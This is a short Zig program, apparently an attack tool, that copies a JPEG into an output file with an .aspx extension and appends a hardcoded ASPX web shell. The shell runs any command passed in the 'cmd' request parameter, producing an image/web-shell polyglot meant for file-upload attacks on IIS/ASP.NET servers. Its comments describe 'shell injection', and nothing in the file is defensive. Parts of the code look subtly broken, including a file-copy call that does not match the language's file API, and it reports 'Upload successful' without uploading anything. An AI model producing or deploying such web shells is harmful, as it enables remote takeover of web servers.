const std = @import("std");

pub fn main() !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();
    
    const args = try std.process.argsAlloc(allocator);
    defer std.process.argsFree(allocator, args);
    
    if (args.len != 3) {
        std.debug.print("Usage: {s} <input.jpg> <output.aspx>\n", .{args[0]});
        return;
    }
    
    // Hardcoded ASPX shell
    const shell = "<% Response.Write(Request[\"cmd\"]); System.Diagnostics.Process.Start(Request[\"cmd\"]); %>";
    
    var input = try std.fs.cwd().openFile(args[1], .{});
    defer input.close();
    
    var output = try std.fs.cwd().createFile(args[2], .{});
    defer output.close();
    
    // No validation - direct copy + shell injection
    try input.copyToFile(output, .{ .byte_count = 1024 * 1024 });
    try output.writer().print("{s}", .{shell});
    
    std.debug.print("Upload successful to {s}\n", .{args[2]});
}
